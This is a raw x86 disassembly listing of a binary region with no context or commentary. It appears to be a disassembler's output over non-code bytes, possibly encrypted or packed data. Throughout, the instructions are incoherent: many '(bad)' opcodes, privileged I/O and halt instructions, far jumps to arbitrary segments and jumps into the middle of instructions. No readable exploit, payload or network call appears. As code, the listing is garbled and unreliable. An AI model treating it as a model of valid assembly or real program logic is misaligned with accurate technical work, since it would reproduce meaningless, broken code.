  405fd6:	mov    ah,0xf
  405fd8:	and    ecx,0x735d5ace
  405fde:	outs   dx,BYTE PTR ds:[esi]
  405fdf:	cmc    
  405fe0:	mov    ds:0x4f8df98,al
  405fe5:	iret   
  405fe6:	pop    eax
  405fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fe8:	imul   ebp,edi,0xffffffff
  405feb:	hlt    
  405fec:	fld    DWORD PTR [eax+0x50b9cb4c]
  405ff2:	std    
  405ff3:	fs jb  0x405fdf
  405ff6:	jmp    0x405ffa
  405ff8:	add    BYTE PTR [eax],al
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	loop   0x405fbe
  406008:	lahf   
  406009:	fmul   DWORD PTR [ecx+0x4d7878c2]
  40600f:	jle    0x406089
  406011:	js     0x40602f
  406013:	hlt    
  406014:	jne    0x405f9d
  406016:	mov    ds:0xa2be7ea2,eax
  40601b:	mov    ch,0x9
  40601d:	push   eax
  40601e:	imul   esi,ebp,0xffffff87
  406021:	lds    edx,FWORD PTR [ecx]
  406023:	mov    al,ds:0xb39f9405
  406028:	sahf   
  406029:	scas   al,BYTE PTR es:[edi]
  40602a:	sbb    edx,DWORD PTR [ecx+0x1bf98ffc]
  406030:	mov    ebp,0xafed7661
  406035:	pusha  
  406036:	add    al,0x52
  406038:	leave  
  406039:	or     edi,DWORD PTR [ebx+0xa]
  40603c:	shl    BYTE PTR [ecx-0x71],1
  40603f:	pminsw mm4,QWORD PTR [ebp+0x1a]
  406043:	jmp    0x829be876
  406048:	pushf  
  406049:	jge    0x406065
  40604b:	ja     0x406032
  40604d:	(bad)  
  40604e:	xor    al,0x34
  406050:	fistp  WORD PTR [ebx+0x7cc282b2]
  406056:	adc    BYTE PTR [edi-0x42],dl
  406059:	mov    edi,0x46513f93
  40605e:	fild   QWORD PTR [ebx-0x4a1cbdaa]
  406064:	push   esp
  406065:	add    al,0x3b
  406067:	aad    0xb1
  406069:	lahf   
  40606a:	jns    0x406027
  40606c:	inc    ebp
  40606d:	daa    
  40606e:	lahf   
  40606f:	jmp    0x406005
  406071:	or     ah,BYTE PTR [edi]
  406073:	in     eax,0x29
  406075:	xor    bl,BYTE PTR [eax-0x1908730a]
  40607b:	cld    
  40607c:	xor    DWORD PTR [ebx-0x7c17e3d8],ecx
  406082:	nop
  406083:	repnz out dx,al
  406085:	ins    BYTE PTR es:[edi],dx
  406086:	push   eax
  406087:	jb     0x4060c0
  406089:	dec    ecx
  40608a:	rcl    DWORD PTR [edx-0x377c3796],0x48
  406091:	(bad)  
  406092:	jae    0x406047
  406094:	mov    eax,0x194b036f
  406099:	sub    DWORD PTR [edi+0x14b29799],edx
  40609f:	fwait
  4060a0:	aaa    
  4060a1:	popf   
  4060a2:	lock xchg ebp,eax
  4060a4:	and    ecx,DWORD PTR [ebx+0x724facec]
  4060aa:	xor    al,0xab
  4060ac:	add    eax,0x25c202fc
  4060b1:	rcr    edi,0x8f
  4060b4:	fimul  DWORD PTR [ebp+0x56]
  4060b7:	loopne 0x406116
  4060b9:	inc    edi
  4060ba:	out    0x9f,eax
  4060bc:	push   0xffffffa4
  4060be:	pop    esp
  4060c0:	mov    dl,0x45
  4060c2:	xchg   ebp,eax
  4060c3:	rcl    BYTE PTR fs:[edx-0x22],0x9b
  4060c8:	hlt    
  4060c9:	fdivr  QWORD PTR ds:0xc721db9c
  4060cf:	in     al,0x1a
  4060d1:	pop    eax
  4060d2:	xor    al,0x71
  4060d4:	retf   
  4060d5:	mov    eax,0x7245007a
  4060da:	push   0x18
  4060dc:	cmc    
  4060dd:	add    DWORD PTR [ecx+0x9a28408],0x1b
  4060e4:	push   esp
  4060e5:	inc    eax
  4060e6:	push   edx
  4060e7:	sbb    DWORD PTR [esi+0x2032d306],edi
  4060ed:	icebp  
  4060ee:	test   eax,0xe9a2ae3a
  4060f3:	hlt    
  4060f4:	jns    0x406167
  4060f6:	scas   al,BYTE PTR es:[edi]
  4060f7:	jmp    0x40608e
  4060f9:	int    0x98
  4060fb:	sbb    dh,dh
  4060fd:	ss aaa 
  4060ff:	push   DWORD PTR [eax]
  406101:	(bad)  
  406102:	retf   
  406103:	xchg   esi,eax
  406104:	test   al,0xf1
  406106:	jmp    0x472a:0x432f4b66
  40610d:	add    eax,0x40e9b79f
  406113:	scas   al,BYTE PTR es:[edi]
  406114:	sub    DWORD PTR [ebp+0x7222ac9b],esp
  40611a:	and    al,0xdf
  40611c:	mov    ebp,0xdbc82388
  406121:	pop    esp
  406122:	(bad)
  406126:	sbb    ebx,eax
  406128:	push   ebx
  406129:	push   edx
  40612a:	mov    bl,0x6d
  40612c:	jnp    0x4060b3
  40612e:	cmp    cl,BYTE PTR [esi-0x4e]
  406131:	fwait
  406132:	bound  edi,QWORD PTR [ebp-0x6b64ad82]
  406138:	mov    bh,0xaf
  40613a:	mov    ss,WORD PTR [eax]
  40613c:	mov    cl,0xd1
  40613e:	(bad)  
  40613f:	std    
  406140:	pop    edx
  406141:	pushf  
  406142:	shl    BYTE PTR [edi-0x6f98211],0x87
  406149:	mov    DWORD PTR [edi+0x14],edi
  40614c:	je     0x4060f0
  40614e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40614f:	or     DWORD PTR [edx],esp
  406151:	rcl    BYTE PTR [edi+0x16],0x5f
  406155:	mov    ecx,0x9c668a76
  40615a:	aam    0xdb
  40615c:	lds    eax,FWORD PTR [esi+0x4d]
  40615f:	mov    ah,0x24
  406161:	pop    ss
  406162:	call   0xdeee:0x5aad4ccc
  406169:	sar    edi,cl
  40616b:	enter  0xbbca,0xa6
  40616f:	xor    dh,BYTE PTR [eax+0x3b5c75e6]
  406175:	and    BYTE PTR [eax-0x74],al
  406178:	fcmovnu st,st(6)
  40617a:	enter  0xbf60,0xf2
  40617e:	xor    DWORD PTR [ebx+0x2b],0xfc1d6662
  406185:	adc    dh,dh
  406187:	mov    ds:0x39af07aa,eax
  40618c:	xchg   edx,eax
  40618d:	sbb    DWORD PTR [ebx+0x312dd749],esp
  406193:	and    ebx,ecx
  406195:	or     al,0x8a
  406197:	loope  0x406139
  406199:	in     eax,dx
  40619a:	fisubr WORD PTR [esi]
  40619c:	js     0x406161
  40619e:	in     al,0xc1
  4061a0:	je     0x4061fd
  4061a2:	sbb    al,dh
  4061a4:	pop    ebp
  4061a5:	aaa    
  4061a6:	jp     0x40613c
  4061a8:	pop    edx
  4061a9:	sbb    al,0x79
  4061ab:	les    ebx,FWORD PTR [esi]
  4061ad:	mov    ch,0xa4
  4061af:	pop    esp
  4061b0:	mov    ebp,ebp
  4061b2:	push   cs
  4061b3:	ss (bad) 
  4061b5:	into   
  4061b6:	cmp    cl,BYTE PTR [ebp-0x2a]
  4061b9:	mov    ah,0x4d
  4061bb:	popa   
  4061bc:	jge    0x40621c
  4061be:	sbb    eax,0x99ba6c3e
  4061c3:	mov    bl,0xe6
  4061c5:	cmp    ebx,ebp
  4061c7:	mov    BYTE PTR [edi+0x2],dl
  4061ca:	xchg   ebx,eax
  4061cb:	sbb    eax,0xc8d09ed7
  4061d0:	xor    BYTE PTR [esi-0x37],bh
  4061d3:	mov    esi,0xf8454124
  4061d8:	xor    al,0x6f
  4061da:	retf   
  4061db:	in     eax,0x98
  4061dd:	xchg   ebx,eax
  4061de:	aaa    
  4061df:	repnz jecxz 0x406231
  4061e2:	xlat   BYTE PTR ds:[ebx]
  4061e4:	out    0xca,eax
  4061e6:	pop    eax
  4061e7:	inc    edx
  4061e8:	shl    BYTE PTR [edx],0xa6
  4061eb:	and    DWORD PTR [edi+0x227b856],0x27
  4061f2:	push   0xab2ba3a0
  4061f7:	int3   
  4061f8:	push   edx
  4061f9:	fldpi  
  4061fb:	das    
  4061fc:	enter  0x9411,0xf6
  406200:	push   0xe
  406202:	in     al,dx
  406203:	in     eax,dx
  406204:	jg     0x40622d
  406206:	jge    0x406218
  406208:	fisub  DWORD PTR [ecx+0x30]
  40620b:	outs   dx,BYTE PTR ds:[esi]
  40620c:	das    
  40620d:	sbb    BYTE PTR [ebx-0x7dea1409],0x61
  406214:	and    DWORD PTR [ecx],eax
  406216:	xor    edx,0x3f
  406219:	push   es
  40621a:	dec    ebx
  40621b:	prefetch BYTE PTR [edx-0x50]
  40621f:	mov    es,WORD PTR [edx]
  406221:	jle    0x406242
  406223:	loop   0x4061d5
  406225:	loopne 0x406260
  406227:	pusha  
  406228:	cmc    
  406229:	fwait
  40622a:	cdq    
  40622b:	lods   al,BYTE PTR ds:[esi]
  40622d:	in     al,0x5d
  40622f:	(bad)  
  406230:	jae    0x406219
  406232:	sbb    dl,BYTE PTR [edx-0x1104e534]
  406238:	bound  ebx,QWORD PTR [ebx+esi*2+0x15ead533]
  40623f:	out    dx,al
  406240:	aad    0xa1
  406242:	inc    ecx
  406243:	stc    
  406244:	lock jae 0x406268
  406247:	loope  0x406263
  406249:	aam    0x8d
  40624b:	mov    ah,BYTE PTR [ebx-0x77a132c8]
  406251:	or     DWORD PTR [ecx+ecx*4],0xe69988d7
  406258:	fidiv  WORD PTR [ebp+0x43f382b0]
  40625e:	inc    esp
  40625f:	lds    esp,FWORD PTR [ecx+0x24]
  406262:	or     eax,0x589e86da
  406267:	inc    ebx
  406268:	mov    edi,0x35bb4674
  40626d:	loopne 0x406288
  40626f:	jle    0x4062b0
  406271:	push   es
  406272:	xor    ecx,DWORD PTR [ecx+0x14]
  406275:	and    DWORD PTR [esi+0x38],ebx
  406278:	fstp   TBYTE PTR [ecx+0x7c2054c6]
  40627e:	shl    BYTE PTR [esi+edi*2-0x7a],0xe2
  406283:	adc    eax,0x8e2e419f
  406288:	or     eax,0x120c9e68
  40628d:	sub    eax,DWORD PTR [ebp-0x21]
  406290:	xor    DWORD PTR [esi-0x79037bdc],edi
  406296:	fcomp  DWORD PTR [edi]
  406298:	or     cl,BYTE PTR [edx+0x21]
  40629b:	adc    al,0xec
  40629d:	ror    DWORD PTR [edi],1
  40629f:	dec    edx
  4062a0:	iret   
  4062a1:	stc    
  4062a2:	cmp    ecx,ebx
  4062a4:	mov    ah,0x9c
  4062a6:	mov    edx,0xcf278d37
  4062ab:	push   es
  4062ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062ad:	cmp    BYTE PTR [esi-0x1e],0x35
  4062b1:	pop    eax
  4062b2:	nop
  4062b3:	mov    ch,0x40
  4062b5:	iret   
  4062b6:	jo     0x406312
  4062b8:	call   0x345f:0xee99fa11
  4062bf:	xor    DWORD PTR [edi+ebx*4+0x71],ebp
  4062c3:	xchg   ecx,eax
  4062c4:	iret   
  4062c5:	xchg   esp,eax
  4062c6:	mov    ebp,0xbc16fb44
  4062cb:	pop    esp
  4062cc:	inc    esp
  4062cd:	jne    0x40629a
  4062cf:	mov    ds:0xcf2b1033,eax
  4062d4:	push   ecx
  4062d5:	mov    ecx,0x74f8a84f
  4062da:	jae    0x4062ff
  4062dc:	adc    cl,BYTE PTR [edi+0x4f76382e]
  4062e2:	fmul   QWORD PTR [edi-0x740e0808]
  4062e8:	dec    ebp
  4062e9:	adc    cl,ch
  4062eb:	jmp    0x4062ef
  4062ed:	add    BYTE PTR [eax],al
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0xe746325c
  4062fe:	pushf  
  4062ff:	faddp  st(7),st
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x406314
  406308:	cli    
  406309:	sbb    dh,ch
  40630b:	mov    eax,ds:0x8d73523c
  406310:	dec    esi
  406311:	addr16 aam 0x90
  406314:	cli    
  406315:	mov    ebx,0x8f282e92
  40631a:	stc    
  40631b:	xchg   edx,eax
  40631c:	iret   
  40631d:	xchg   BYTE PTR [ecx+edx*4],dh
  406320:	xchg   edx,eax
  406321:	xchg   ecx,eax
  406322:	test   al,0xc9
  406324:	adc    edx,ebx
  406326:	push   0x7a
  406328:	pop    edi
  406329:	pop    ebx
  40632a:	pop    ebp
  40632b:	aas    
  40632c:	std    
  40632d:	int    0x76
  40632f:	xor    cl,BYTE PTR [edx+0x15c81063]
  406335:	out    dx,al
  406336:	aad    0xd0
  406338:	in     eax,0x1b
  40633a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40633b:	jecxz  0x4063ae
  40633d:	scas   eax,DWORD PTR es:[edi]
  40633e:	cmp    ebx,DWORD PTR [esi-0x37b58060]
  406344:	or     al,0x7a
  406346:	cmp    eax,0x81633d0f
  40634b:	fmul   st(7),st
  40634d:	hlt    
  40634e:	push   es
  40634f:	out    0xe8,al
  406351:	xchg   DWORD PTR [eax],edx
  406353:	iret   
  406354:	shr    DWORD PTR [ecx+0x30],cl
  406357:	xchg   esp,eax
  406358:	aas    
  406359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40635a:	cmp    eax,0x5f643aad
  40635f:	xor    al,0x52
  406361:	cwde   
  406362:	loope  0x406307
  406364:	lahf   
  406365:	mov    cl,0xc7
  406367:	pop    ecx
  406368:	and    eax,DWORD PTR [esi+0x3335ccb]
  40636e:	push   0x41
  406370:	fistp  QWORD PTR [ecx]
  406372:	dec    esi
  406373:	ja     0x4063e7
  406375:	into   
  406376:	xchg   edi,eax
  406377:	lods   al,BYTE PTR ds:[esi]
  406378:	in     eax,0xfa
  40637a:	stos   DWORD PTR es:[edi],eax
  40637b:	ds and al,bl
  40637e:	mov    bl,0x8c
  406380:	aad    0x23
  406382:	jmp    0x52d1:0xbea26330
  406389:	(bad)  [eax+0x3d]
  40638c:	add    eax,0x2b60e55a
  406391:	push   es
  406392:	ins    DWORD PTR es:[edi],dx
  406393:	or     cl,BYTE PTR [eax]
  406395:	fnstsw WORD PTR cs:[edx-0x28]
  406399:	hlt    
  40639a:	(bad)  
  40639b:	mov    ebx,?
  40639d:	pusha  
  40639e:	add    DWORD PTR ds:0x6f15ebc4,esi
  4063a4:	iret   
  4063a5:	retf   0xa0fc
  4063a8:	dec    ebp
  4063a9:	bound  ebx,QWORD PTR [ecx-0xb33a06]
  4063af:	outs   dx,DWORD PTR ds:[esi]
  4063b0:	(bad)  
  4063b2:	mov    ecx,0x1bab30ee
  4063b7:	sub    BYTE PTR [ebp-0x47],ah
  4063ba:	cld    
  4063bb:	mov    DWORD PTR [esi],esi
  4063bd:	adc    al,0x79
  4063bf:	and    edi,ecx
  4063c1:	test   al,0xbc
  4063c3:	lods   eax,DWORD PTR ds:[esi]
  4063c4:	ror    BYTE PTR [edx+esi*1-0x61234547],1
  4063cb:	(bad)  
  4063cc:	adc    al,0xb5
  4063ce:	inc    ebp
  4063cf:	add    al,0xe0
  4063d1:	mov    bh,0x4a
  4063d3:	mov    BYTE PTR [ebx],bl
  4063d5:	lds    ecx,FWORD PTR [ebx-0x4dfe8f04]
  4063db:	(bad)  
  4063dc:	stos   BYTE PTR es:[edi],al
  4063dd:	ja     0x406418
  4063df:	mov    ch,0xe4
  4063e1:	jnp    0x406397
  4063e3:	mov    ds:0xa2327173,al
  4063e8:	adc    dh,ah
  4063ea:	pop    DWORD PTR [ebp-0x6d]
  4063ed:	or     DWORD PTR ds:0xb0abb316,edx
  4063f3:	sub    al,0x6b
  4063f5:	push   es
  4063f6:	jmp    0x4063f3
  4063f8:	or     DWORD PTR [ebp+0x63],0xffffff86
  4063fc:	add    cl,BYTE PTR [ecx]
  4063fe:	retf   
  4063ff:	or     eax,0x92189b9e
  406404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406405:	mov    al,ds:0xa3b1d5b2
  40640a:	push   ebp
  40640b:	outs   dx,DWORD PTR ds:[esi]
  40640c:	dec    esi
  40640d:	jbe    0x40643b
  40640f:	je     0x40645b
  406411:	das    
  406412:	lods   al,BYTE PTR ds:[esi]
  406413:	sbb    bh,bl
  406415:	js     0x406415
  406417:	xor    DWORD PTR [ebx-0x39],esi
  40641a:	leave  
  40641b:	and    esp,esp
  40641d:	sbb    BYTE PTR [ecx],al
  40641f:	and    cl,bh
  406421:	mov    bh,0xa3
  406423:	in     eax,0x8e
  406425:	mov    dl,0x76
  406427:	fnstsw WORD PTR [ecx]
  406429:	out    dx,eax
  40642a:	inc    ebp
  40642b:	clc    
  40642c:	pusha  
  40642d:	ror    bh,0xbd
  406430:	adc    al,0x3e
  406432:	lock jne 0x4063c7
  406435:	lds    esp,FWORD PTR [eax+0x4773920]
  40643b:	scas   al,BYTE PTR es:[edi]
  40643c:	xchg   ebp,eax
  40643d:	xor    dh,BYTE PTR [edi]
  40643f:	pop    DWORD PTR [esi]
  406441:	jbe    0x4063d3
  406443:	mov    bl,0x6f
  406445:	lahf   
  406446:	dec    edi
  406447:	pop    ds
  406448:	dec    edi
  406449:	scas   eax,DWORD PTR es:[edi]
  40644a:	mov    al,ds:0x31e2b04c
  40644f:	adc    BYTE PTR [ecx+0x77d702bf],al
  406455:	js     0x4064c5
  406457:	mov    dh,0xaf
  406459:	jne    0x406417
  40645b:	aaa    
  40645c:	cmp    eax,0xc623c362
  406461:	adc    WORD PTR [edx],bp
  406464:	pop    ds
  406465:	sti    
  406466:	lods   al,BYTE PTR ds:[esi]
  406467:	mov    eax,ds:0xbbcc352f
  40646c:	(bad)  
  40646d:	cs jmp 0x406418
  406470:	and    cl,BYTE PTR [edi]
  406472:	stos   DWORD PTR es:[edi],eax
  406473:	add    eax,0xfffeb655
  406478:	call   0x26102ef0
  40647d:	push   0x65
  40647f:	(bad)  
  406480:	(bad)  [ebp+edi*2+0x5c]
  406484:	sbb    eax,0x521ff0db
  406489:	imul   esi,DWORD PTR [esi+0x7362471d],0xffffffc2
  406490:	fdivr  DWORD PTR [esi+edi*1+0x51]
  406494:	daa    
  406495:	xchg   esi,eax
  406496:	jmp    FWORD PTR [ecx]
  406498:	rcr    BYTE PTR [edx-0x4fe647ac],0x7d
  40649f:	add    eax,0xeade21a9
  4064a4:	stc    
  4064a5:	or     eax,0xf2956432
  4064aa:	mov    ah,0x8
  4064ac:	push   ebx
  4064ad:	cli    
  4064ae:	adc    edi,DWORD PTR [edi]
  4064b0:	daa    
  4064b1:	mov    bl,0x5f
  4064b3:	imul   esi,DWORD PTR [edx-0x69],0xc3a38a42
  4064ba:	add    eax,0x143fec80
  4064bf:	adc    bl,dl
  4064c1:	inc    ecx
  4064c2:	push   DWORD PTR [esi-0x5c]
  4064c5:	xchg   ebp,eax
  4064c6:	cmp    ebp,DWORD PTR [esi+0x37]
  4064c9:	adc    ecx,esp
  4064cb:	loope  0x40653f
  4064cd:	xlat   BYTE PTR ds:[ebx]
  4064ce:	xchg   esi,eax
  4064cf:	(bad)  
  4064d0:	outs   dx,BYTE PTR ds:[esi]
  4064d1:	hlt    
  4064d2:	test   eax,0x3eee4fac
  4064d7:	mov    bh,0x53
  4064d9:	dec    eax
  4064da:	mov    ds:0x5cacdb93,eax
  4064df:	mov    ds:0x628bcf77,eax
  4064e4:	add    BYTE PTR [ebx+0x364da1a5],ch
  4064ea:	push   edx
  4064eb:	out    dx,al
  4064ec:	sub    BYTE PTR [ecx],dl
  4064ee:	push   eax
  4064ef:	mov    ss:0xde5d363d,eax
  4064f5:	sub    edx,DWORD PTR [ecx+0x11aa4c99]
  4064fb:	cmp    BYTE PTR [ecx+0x3c4135c1],al
  406501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406502:	out    0xf6,eax
  406504:	lea    esp,[ebx-0x6]
  406507:	adc    BYTE PTR [ebp+0x71],dl
  40650a:	out    dx,al
  40650b:	leave  
  40650c:	inc    esp
  40650d:	mov    al,0x79
  40650f:	jbe    0x406499
  406511:	push   cs
  406512:	sbb    al,0xfc
  406514:	adc    DWORD PTR [ecx],ebp
  406516:	push   ds
  406517:	hlt    
  406518:	repnz out 0x13,al
  40651b:	clc    
  40651c:	push   0xf0a608f3
  406521:	in     al,0xfa
  406523:	jmp    0x40659f
  406525:	add    al,0xd4
  406527:	push   ecx
  406528:	test   eax,0x626d2683
  40652d:	adc    eax,0x42b40ae4
  406532:	sub    BYTE PTR [ecx+0x25b94e6b],al
  406538:	aam    0xba
  40653a:	fsub   DWORD PTR [ecx+0x44]
  40653d:	jecxz  0x40651b
  40653f:	xor    eax,0x33140643
  406544:	sti    
  406545:	arpl   WORD PTR [edi],dx
  406547:	fild   WORD PTR [edi-0x7d]
  40654a:	pop    ss
  40654b:	pop    esi
  40654c:	out    0x89,al
  40654e:	sub    bh,bl
  406550:	je     0x4065ca
  406552:	mov    dl,0xc0
  406554:	mov    ah,0xf3
  406556:	mov    edx,0x76c505c1
  40655b:	fdivr  DWORD PTR [eax]
  40655d:	jno    0x406572
  40655f:	cmc    
  406560:	into   
  406561:	ss test al,0xf7
  406564:	sub    BYTE PTR ds:0x606e72db,dh
  40656a:	xchg   esp,eax
  40656b:	clc    
  40656c:	and    DWORD PTR [ebp+esi*1+0x4c],edi
  406570:	pop    edx
  406571:	dec    esp
  406572:	cdq    
  406573:	push   eax
  406574:	neg    DWORD PTR [edi+0x57744059]
  40657a:	adc    BYTE PTR [ebp+0x49],ah
  40657d:	or     BYTE PTR [eax-0x1adf7c8a],ch
  406583:	es pop es
  406585:	jnp    0x4065e6
  406587:	xor    al,0x58
  406589:	fs and bh,bl
  40658c:	pushf  
  40658d:	mov    esi,0xa7484c32
  406592:	xchg   edi,eax
  406593:	xchg   edx,eax
  406594:	mov    ecx,0xad821ace
  406599:	mov    esi,0xb2a05625
  40659e:	shl    BYTE PTR [edi+0x12ae075b],0x18
  4065a5:	adc    al,0x17
  4065a7:	ins    DWORD PTR es:[edi],dx
  4065a8:	push   0xffffffbc
  4065aa:	jnp    0x4065d6
  4065ac:	add    eax,0x35e1ceb8
  4065b1:	xor    al,0x8c
  4065b3:	sub    edi,DWORD PTR [edx+edi*2+0x32203786]
  4065ba:	push   esi
  4065bb:	dec    esp
  4065bc:	imul   esi,DWORD PTR [esi],0x829a304b
  4065c2:	sbb    edi,DWORD PTR ds:0x92ba41f2
  4065c8:	mov    eax,ds:0x3e4d5206
  4065cd:	ficom  WORD PTR ds:0xe04befa0
  4065d3:	xchg   ecx,eax
  4065d4:	pushf  
  4065d5:	sub    dh,BYTE PTR [edi+eiz*1-0x4b]
  4065d9:	iret   
  4065da:	and    ecx,eax
  4065dc:	or     ecx,0x81161d8e
  4065e2:	mov    eax,ecx
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	fadd   DWORD PTR [esi+edx*4+0x39]
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x406593
  406602:	pushf  
  406603:	jmp    DWORD PTR [ebx+0x58]
  406606:	or     al,0x54
  406608:	push   edx
  406609:	or     esp,DWORD PTR [ebp-0x60618eeb]
  40660f:	(bad)  [ecx+0x148d0ca2]
  406615:	gs or  al,0xb8
  406618:	add    eax,0xbdb5c7b6
  40661d:	outs   dx,DWORD PTR ds:[esi]
  40661e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40661f:	inc    ebp
  406620:	shl    DWORD PTR [eax],1
  406622:	in     al,0xb9
  406624:	aaa    
  406625:	jne    0x406646
  406627:	inc    eax
  406628:	sub    DWORD PTR [eax-0x32acdd2c],0x164a06cd
  406632:	jbe    0x406654
  406634:	cli    
  406635:	sar    eax,1
  406637:	fstp   QWORD PTR ds:0xabe0830b
  40663d:	jmp    0xfc34:0x44b9dee3
  406644:	add    WORD PTR [edx+0x41],cx
  406648:	sbb    edx,DWORD PTR [ecx+0x58fa25fd]
  40664e:	cmc    
  40664f:	cli    
  406650:	fcomp  st(3)
  406652:	test   ch,0xe
  406655:	dec    edx
  406656:	sahf   
  406657:	pop    edi
  406658:	int    0x4
  40665a:	sub    ecx,DWORD PTR [edx]
  40665c:	add    BYTE PTR [edi+0x1537486],0xb3
  406663:	cld    
  406664:	call   0x8053f47f
  406669:	lods   al,BYTE PTR ds:[esi]
  40666a:	xchg   BYTE PTR [edi+edx*1],dl
  40666d:	jnp    0x406639
  40666f:	stos   BYTE PTR es:[edi],al
  406670:	lock sti 
  406672:	dec    ebp
  406673:	outs   dx,DWORD PTR ds:[esi]
  406674:	ret    
  406675:	add    dh,BYTE PTR [edx+0x1]
  406678:	push   ebx
  406679:	into   
  40667a:	add    BYTE PTR [ecx+0x75f16827],ch
  406680:	mov    gs,ebp
  406682:	shl    DWORD PTR [edi-0x4d],1
  406685:	fs movsx esp,bh
  406689:	out    0x4e,eax
  40668b:	ret    
  40668c:	jb     0x40669f
  40668e:	daa    
  40668f:	mov    ds:0x59cc19be,al
  406694:	in     al,0xeb
  406696:	jg     0x4066b5
  406698:	mov    dl,0x49
  40669a:	(bad)  
  40669b:	test   BYTE PTR [ebp+0x2698ff99],al
  4066a1:	jle    0x40671c
  4066a3:	ret    
  4066a4:	adc    dh,BYTE PTR [ebx]
  4066a6:	mov    eax,ds:0xb2acd274
  4066ab:	test   BYTE PTR [esi],ah
  4066ad:	popf   
  4066ae:	js     0x40669a
  4066b0:	jmp    0x4e7:0x730bb306
  4066b7:	(bad)  
  4066b8:	mov    bh,0x97
  4066ba:	ss jns 0x406732
  4066bd:	push   es
  4066be:	mov    eax,0xb85eca5e
  4066c3:	xor    BYTE PTR [ebx+0xb],ah
  4066c6:	dec    edx
  4066c7:	lahf   
  4066c8:	dec    edi
  4066c9:	cdq    
  4066ca:	rcl    DWORD PTR [ecx],1
  4066cc:	jb     0x4066eb
  4066ce:	push   eax
  4066cf:	in     al,0x3a
  4066d1:	in     al,dx
  4066d2:	lahf   
  4066d3:	scas   eax,DWORD PTR es:[edi]
  4066d4:	call   0x4ad0:0x95d16b85
  4066db:	test   DWORD PTR [ecx-0x58ac721f],esp
  4066e1:	pop    ss
  4066e2:	test   al,0x84
  4066e4:	cmp    cl,0xfb
  4066e7:	fnsetpm(287 only) 
  4066e9:	pop    ebx
  4066ea:	adc    DWORD PTR [ecx+0x43],esp
  4066ed:	push   0xeb9e2429
  4066f2:	or     eax,0xe22ed04
  4066f7:	sbb    BYTE PTR [edi-0x24],bh
  4066fa:	daa    
  4066fb:	shr    BYTE PTR [edx+0x6a],cl
  4066fe:	xchg   ebp,eax
  4066ff:	mov    al,0x3
  406701:	pop    esi
  406702:	adc    BYTE PTR [edx+0x8215a2d],cl
  406708:	add    DWORD PTR [eax],ebx
  40670a:	cmp    ebp,0x5b56f9
  406710:	into   
  406711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406712:	jle    0x406765
  406714:	lds    eax,FWORD PTR [esi+0x39]
  406717:	test   eax,0xae3151d1
  40671c:	les    ebp,FWORD PTR [ecx]
  40671e:	inc    ebx
  40671f:	sar    DWORD PTR [edx+0x3b],1
  406722:	popa   
  406723:	sbb    esp,DWORD PTR [ecx+ebp*4-0x4b869eab]
  40672a:	mov    cl,0x95
  40672c:	jbe    0x40676f
  40672e:	mov    ds:0xb01f8321,eax
  406733:	cmp    BYTE PTR [edi],bl
  406735:	xor    ecx,DWORD PTR [ebx-0x1a]
  406738:	jmp    0x406751
  40673a:	hlt    
  40673b:	sbb    al,0xf3
  40673d:	mov    ecx,0x13bcac45
  406742:	rcl    BYTE PTR [edx+0x3f],cl
  406745:	ins    DWORD PTR es:[edi],dx
  406746:	mov    edi,0x9eaac8a6
  40674b:	cmp    al,0xa7
  40674d:	loope  0x40674b
  40674f:	ret    
  406750:	xchg   edx,eax
  406751:	lahf   
  406752:	and    al,0xdb
  406754:	jmp    0x5d3613f5
  406759:	xor    bl,al
  40675b:	les    ebx,FWORD PTR [eax+0x77c7b1bc]
  406761:	call   0xd15b88a3
  406766:	jle    0x406789
  406768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406769:	(bad)  
  40676a:	vaddps ymm1,ymm0,YMMWORD PTR [edx]
  40676e:	sub    BYTE PTR es:[esi+0x4],ah
  406772:	dec    ebx
  406773:	add    al,0x3a
  406775:	or     dh,bh
  406777:	add    eax,0x2b84c245
  40677c:	jns    0x40678a
  40677e:	mov    ch,cl
  406780:	pushf  
  406781:	push   0x1dc53715
  406786:	ficomp WORD PTR ds:0x5d006bc9
  40678c:	test   DWORD PTR [edi],edx
  40678e:	aad    0x44
  406790:	pop    ds
  406791:	and    esp,DWORD PTR [ebx+0x60]
  406794:	ds mov ebp,0xabe43f35
  40679a:	xor    bh,BYTE PTR [eax-0x5d]
  40679d:	loop   0x40678f
  40679f:	jnp    0x4067cc
  4067a1:	cli    
  4067a2:	lods   al,BYTE PTR ds:[esi]
  4067a3:	and    BYTE PTR [eax],dl
  4067a5:	aad    0x1a
  4067a7:	outs   dx,BYTE PTR ds:[esi]
  4067a8:	(bad)  
  4067a9:	icebp  
  4067aa:	xchg   ebp,eax
  4067ab:	div    BYTE PTR [ecx+edi*2-0x32f8c5ab]
  4067b2:	xchg   edi,eax
  4067b3:	or     dh,dl
  4067b5:	jge    0x4067d0
  4067b7:	outs   dx,DWORD PTR ds:[esi]
  4067b8:	jae    0x4067ff
  4067ba:	cmp    BYTE PTR [ebx+0x3fb16b91],dh
  4067c0:	in     al,dx
  4067c1:	aas    
  4067c2:	xchg   ecx,eax
  4067c4:	xchg   ebp,eax
  4067c5:	cmovnp edi,DWORD PTR es:[edx-0x4b59d62a]
  4067cd:	pop    ebx
  4067ce:	cs push ebx
